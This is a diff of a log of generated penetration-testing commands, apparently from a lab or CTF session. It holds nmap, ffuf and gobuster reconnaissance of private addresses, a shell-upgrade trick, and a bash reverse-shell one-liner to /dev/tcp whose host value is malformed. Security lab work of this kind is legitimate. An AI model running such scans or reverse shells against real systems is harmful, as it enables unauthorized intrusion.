@@ -1,12 +1,7 @@
-[2025-12-23 12:44:58] CMD GENERADO: nmap -F 192.168.10.10 -oN scan_fast.txt
-[2025-12-23 16:02:13] CMD GENERADO: nmap -p- -sV -sC 10.10.10.44 -oN scan_full.txt
-[2025-12-23 16:03:53] CMD GENERADO: nmap -p- -sV -sC 10.10.55.55 -oN scan_full.txt
-[2025-12-23 16:16:49] CMD GENERADO: nmap -F 10.10.10.55 -oN scan_fast.txt
-[2025-12-23 16:29:24] CMD GENERADO: ffuf -u http://10.10.10.55/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php
-[2025-12-25 08:17:56] CMD GENERADO: nmap -F 10.10.10.200 -oN scan_fast.txt
-[2025-12-25 08:27:25] CMD GENERADO: nmap -p- -sV -sC 127.0.0.1 -oN scan_full.txt
-[2025-12-25 08:29:00] CMD GENERADO: nmap -F 10.10.10.200 -oN scan_fast.txt
-[2025-12-25 08:30:58] CMD GENERADO: nmap -F 192.168.10.10 -oN scan_fast.txt
-[2025-12-25 08:31:14] CMD GENERADO: nmap -F 192.168.10.10 -oN scan_fast.txt
-[2025-12-25 08:31:54] CMD GENERADO: nmap -F 127.0.0.1 -oN scan_fast.txt
-[2025-12-25 08:32:21] CMD GENERADO: nmap -F 127.0.0.1 -oN scan_fast.txt
+[2025-12-25 15:22:52] CMD GENERADO: script /dev/null -c bash
+[2025-12-25 15:51:15] CMD GENERADO: nmap -F 10.10.10.200 -oN scan_fast.txt
+[2025-12-25 15:53:51] CMD GENERADO: nmap -p- -sV -sC 10.10.10.200 -oN scan_full.txt
+[2025-12-25 15:54:04] CMD GENERADO: nmap -p- -sV -sC 10.10.10.200 -oN scan_full.txt
+[2025-12-25 16:38:15] CMD GENERADO: ffuf -u http://10.10.10.200/FUZZ -w /usr/share/wordlists/dirb/common.txt
+[2025-12-25 16:41:29] CMD GENERADO: gobuster dir -u http://10.10.10.200 -w /usr/share/wordlists/dirb/common.txt
+[2025-12-25 16:41:38] CMD GENERADO: bash -i >& /dev/tcp/21221/4444 0>&1
